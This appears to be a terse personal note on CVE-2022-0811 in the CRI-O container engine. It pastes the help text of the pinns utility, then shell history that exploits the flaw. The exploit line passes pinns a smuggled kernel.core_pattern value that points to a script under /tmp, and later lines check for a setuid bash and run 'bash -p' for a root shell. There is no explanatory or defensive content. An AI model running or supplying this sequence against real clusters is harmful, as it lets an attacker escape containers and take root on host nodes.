
https://github.com/saschagrunert/pinns.rs
https://thehackernews.com/2022/03/new-vulnerability-in-cri-o-engine-lets.html

#
#
#

    pinns v0.1.0-9-g0fccc8b
    A simple utility to pin Linux namespaces

USAGE:
    pinns [FLAGS] [OPTIONS]

FLAGS:
    -c, --cgroup     Pin the cgroup namespace
    -h, --help       Prints help information
    -i, --ipc        Pin the IPC namespace
    -n, --net        Pin the network namespace
    -p, --pid        Pin the PID namespace
    -u, --uts        Pin the UTS namespace
    -V, --version    Prints version information

OPTIONS:
    -d, --dir <DIRECTORY>      The directory for the pinned namespaces
                               [default: /tmp]
    -l, --log-level <LEVEL>    The logging level of the application [default: info]
                               [possible values: trace, debug, info, warn, error,
                               off]

##
##
##

More info at: https://github.com/saschagrunert/pinns.rs

#####################
#####################

    4  pinns -d /var/run -f 844aa3c8-2c60-4245-a7df-9e26768ff303 -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/tmp/THING/YOYO.sh #' --ipc --net --uts --cgroup
    5  man pinns ;; wall lolololol
    6  cd /usr/bin
    7  ls -la 
    8  ls -la | grep bash
    9  bash -p
   10  history
   11  ls
   12  cd /tmp/THING/
   
   
############ cve-2022-0811 ############
